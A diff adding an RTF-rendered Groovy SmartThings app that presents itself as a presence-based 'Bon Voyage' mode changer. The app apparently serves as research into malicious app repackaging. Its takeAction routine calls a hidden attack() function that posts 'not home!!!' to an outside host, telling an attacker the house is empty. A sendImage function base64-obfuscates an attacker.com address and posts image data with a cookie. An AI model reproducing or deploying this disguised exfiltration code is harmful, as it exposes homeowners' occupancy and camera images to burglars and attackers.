@@ -1,0 +1,174 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red64\green128\blue128;\red186\green33\blue33;\red153\green153\blue153;\red25\green23\blue124;\red0\green0\blue255;\red128\green0\blue128;\red187\green187\blue187;\red102\green102\blue102;\red136\green136\blue136;\red0\green128\blue0;\red170\green34\blue255;\red187\green102\blue34;\red187\green102\blue136;\red255\green0\blue0;\red0\green68\blue221;\red188\green122\blue0;\red0\green160\blue0;\red210\green65\blue58;\red0\green0\blue128;\red176\green0\blue64;\red125\green144\blue41;\red160\green0\blue0;\red136\green0\blue0;\red160\green160\blue0;}\f0{\cf1\i /**\par
+ *  shiqiBonVoyageRepackaging\par
+ *\par
+ *  Copyright 2016 Yunhan Jia & Shiqi Wang\par
+ *\par
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except\par
+ *  in compliance with the License. You may obtain a copy of the License at:\par
+ *\par
+ *      http://www.apache.org/licenses/LICENSE-2.0\par
+ *\par
+ *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed\par
+ *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License\par
+ *  for the specific language governing permissions and limitations under the License.\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+    {\cf24 name:} {\cf2 "shiqiBonVoyageRepackaging"}{\cf8 ,}\par
+    {\cf24 namespace:} {\cf2 "wsq"}{\cf8 ,}\par
+    {\cf24 author:} {\cf2 "Yunhan Jia & Shiqi Wang"}{\cf8 ,}\par
+    {\cf24 description:} {\cf2 "Monitors a set of presence detectors and triggers a mode change when everyone has left."}{\cf8 ,}\par
+    {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+    {\cf24 iconUrl:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png"}{\cf8 ,}\par
+    {\cf24 iconX2Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 ,}\par
+    {\cf24 iconX3Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 )}\par
+\par
+\par
+preferences {\cf8 \{}\par
+	section{\cf8 (}{\cf2 "When all of these people leave home"}{\cf8 )} {\cf8 \{}\par
+		input {\cf2 "people"}{\cf8 ,} {\cf2 "capability.presenceSensor"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}\par
+	{\cf8 \}}\par
+	section{\cf8 (}{\cf2 "Change to this mode"}{\cf8 )} {\cf8 \{}\par
+		input {\cf2 "newMode"}{\cf8 ,} {\cf2 "mode"}{\cf8 ,} {\cf24 title:} {\cf2 "Mode?"}\par
+	{\cf8 \}}\par
+	section{\cf8 (}{\cf2 "And text me at (optional)"}{\cf8 )} {\cf8 \{}\par
+		input {\cf2 "phone"}{\cf8 ,} {\cf2 "phone"}{\cf8 ,} {\cf24 title:} {\cf2 "Phone number?"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+	{\cf8 \}}\par
+	section{\cf8 (}{\cf2 "False alarm threshold (defaults to 10 min)"}{\cf8 )} {\cf8 \{}\par
+		input {\cf2 "falseAlarmThreshold"}{\cf8 ,} {\cf2 "decimal"}{\cf8 ,} {\cf24 title:} {\cf2 "Number of minutes"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+	{\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 installed}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "Installed with settings: $\{settings\}"}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "Current mode = $\{location.mode\}, people = $\{people.collect\{it.label + ': ' + it.currentPresence\}\}"}\par
+	subscribe{\cf8 (}people{\cf8 ,} {\cf2 "presence"}{\cf8 ,} presence{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 updated}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "Updated with settings: $\{settings\}"}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "Current mode = $\{location.mode\}, people = $\{people.collect\{it.label + ': ' + it.currentPresence\}\}"}\par
+	unsubscribe{\cf8 (}{\cf8 )}\par
+	subscribe{\cf8 (}people{\cf8 ,} {\cf2 "presence"}{\cf8 ,} presence{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 presence}{\cf8 (}evt{\cf8 )}\par
+{\cf8 \{}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "evt.name: $evt.value"}\par
+	{\cf10\b if} {\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "not present"}{\cf8 )} {\cf8 \{}\par
+		{\cf10\b if} {\cf8 (}location{\cf8 .}{\cf21 mode} {\cf8 !}{\cf8 =} newMode{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 debug} {\cf2 "checking if everyone is away"}\par
+			{\cf10\b if} {\cf8 (}everyoneIsAway{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "starting sequence"}\par
+                {\cf1\i //attack()\par
+}				{\cf20 def} delay {\cf8 =} falseAlarmThreshold {\cf8 !}{\cf8 =} {\cf10\b null} {\cf8 ?} falseAlarmThreshold {\cf8 *} {\cf8 60} {\cf8 :} {\cf8 10} {\cf8 *} {\cf8 60}\par
+				runIn{\cf8 (}delay{\cf8 ,} {\cf2 "takeAction"}{\cf8 )}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+		{\cf10\b else} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 debug} {\cf2 "mode is the same, not evaluating"}\par
+		{\cf8 \}}\par
+	{\cf8 \}}\par
+	{\cf10\b else} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 debug} {\cf2 "canceling"}\par
+		unschedule{\cf8 (}{\cf2 "takeAction"}{\cf8 )}\par
+	{\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 takeAction}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+	{\cf1\i // TODO -- uncomment when app label is available\par
+}	{\cf1\i //def message = "$\{app.label\} changed your mode to '$\{newMode\}' because everyone left home"\par
+}	{\cf20 def} message {\cf8 =} {\cf2 "SmartThings changed your mode to '$\{newMode\}' because everyone left home"}\par
+	log{\cf8 .}{\cf21 info} message\par
+	{\cf5 sendPush}{\cf8 (}message{\cf8 )}\par
+	{\cf10\b if} {\cf8 (}phone{\cf8 )} {\cf8 \{}\par
+		sendSms{\cf8 (}phone{\cf8 ,} message{\cf8 )}\par
+	{\cf8 \}}\par
+	setLocationMode{\cf8 (}newMode{\cf8 )}\par
+    attack{\cf8 (}{\cf8 )}\par
+	unschedule{\cf8 (}{\cf2 "takeAction"}{\cf8 )} {\cf1\i // Temporary work-around to scheduling bug\par
+}{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 everyoneIsAway}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+	{\cf20 def} result {\cf8 =} {\cf10\b true}\par
+	{\cf10\b for} {\cf8 (}person {\cf10\b in} people{\cf8 )} {\cf8 \{}\par
+		{\cf10\b if} {\cf8 (}person{\cf8 .}{\cf21 currentPresence} {\cf8 =}{\cf8 =} {\cf2 "present"}{\cf8 )} {\cf8 \{}\par
+			result {\cf8 =} {\cf10\b false}\par
+			{\cf10\b break}\par
+		{\cf8 \}}\par
+	{\cf8 \}}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "everyoneIsAway: $result"}\par
+	{\cf10\b return} result\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 attack}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "http post"}\par
+    {\cf20 def} takeParams {\cf8 =} {\cf8 [}\par
+            {\cf24 uri:} {\cf2 "https://automated-lore-135923.appspot.com"}{\cf8 ,} {\cf1\i //"https://attacker.com"\par
+}            {\cf24 path:} {\cf2 ""}{\cf8 ,}\par
+            {\cf1\i //headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],\par
+}            {\cf24 requestContentType:} {\cf2 "application/x-www-form-urlencoded"}{\cf8 ,}\par
+            {\cf1\i //query: [width: imgWidth, uuid: uuid],\par
+}            {\cf24 body:} {\cf8 [}\par
+        		{\cf2 "condition"}{\cf8 :} {\cf2 "not home!!!"}\par
+    		{\cf8 ]}\par
+      {\cf8 ]}\par
+      {\cf10\b try} {\cf8 \{}\par
+		httpPost{\cf8 (}takeParams{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+			{\cf10\b if} {\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "attack succeeded"}\par
+                log{\cf8 .}{\cf21 debug} resp{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+			{\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 error} {\cf2 "attack failed"}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}groovyx{\cf8 .}{\cf21 net}{\cf8 .}{\cf21 http}{\cf8 .}{\cf21 HttpResponseException} e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Dropcam get_image failure: $\{e\} with status: $\{e.statusCode\}"}\par
+		{\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 403}{\cf8 )} {\cf8 \{}\par
+			{\cf10\b throw} {\cf10\b new} {\cf5 RuntimeException}{\cf8 (}{\cf2 "Login Required"}{\cf8 )}\par
+		{\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 404}{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 error} {\cf2 "Dropcam 404, camera may be offline"}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}Exception e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Unexpected Dropcam exception"}{\cf8 ,} e\par
+		{\cf1\i //sendNotification("Your dropcam is offline.")\par
+}	 {\cf8 \}}\par
+   \par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 sendImage}{\cf8 (}String imageBytes{\cf8 ,} String uuid{\cf8 ,} Integer imgWidth{\cf8 )} {\cf8 \{}\par
+	 {\cf20 def} encoded {\cf8 =} {\cf2 "d3d3LmF0dGFja2VyLmNvbQ=="}\par
+	 {\cf20 def} takeParams {\cf8 =} {\cf8 [}\par
+            {\cf24 uri:} {\cf2 "$decodeBase64(encoded)"}{\cf8 ,} {\cf1\i //"https://attacker.com"\par
+}            {\cf24 path:} {\cf2 "/get_image"}{\cf8 ,}\par
+            {\cf24 headers:} {\cf8 [}{\cf24 Cookie:} getCookieValue{\cf8 (}{\cf8 )}{\cf8 ,} {\cf2 'User-Agent'}{\cf8 :} validUserAgent{\cf8 (}{\cf8 )}{\cf8 ]}{\cf8 ,}\par
+            {\cf24 requestContentType:} {\cf2 "application/x-www-form-urlencoded"}{\cf8 ,}\par
+            {\cf24 query:} {\cf8 [}{\cf24 width:} imgWidth{\cf8 ,} {\cf24 uuid:} uuid{\cf8 ]}{\cf8 ,}\par
+            {\cf24 body:} {\cf8 [}\par
+        		{\cf2 "image"}{\cf8 :} imageBytes\par
+    		{\cf8 ]}\par
+      {\cf8 ]}\par
+   \par
+	{\cf10\b try} {\cf8 \{}\par
+		httpPost{\cf8 (}takeParams{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+			{\cf10\b if} {\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "attack succeeded"}\par
+			{\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 error} {\cf2 "attack failed"}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+	{\cf8 \}} {\cf10\b catch} {\cf8 (}groovyx{\cf8 .}{\cf21 net}{\cf8 .}{\cf21 http}{\cf8 .}{\cf21 HttpResponseException} e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Dropcam get_image failure: $\{e\} with status: $\{e.statusCode\}"}\par
+		{\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 403}{\cf8 )} {\cf8 \{}\par
+			{\cf10\b throw} {\cf10\b new} {\cf5 RuntimeException}{\cf8 (}{\cf2 "Login Required"}{\cf8 )}\par
+		{\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 404}{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 error} {\cf2 "Dropcam 404, camera may be offline"}\par
+		{\cf8 \}}\par
+	{\cf8 \}} {\cf10\b catch} {\cf8 (}Exception e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Unexpected Dropcam exception"}{\cf8 ,} e\par
+		{\cf1\i //sendNotification("Your dropcam is offline.")\par
+}	{\cf8 \}}\par
+{\cf8 \}}\par
+}
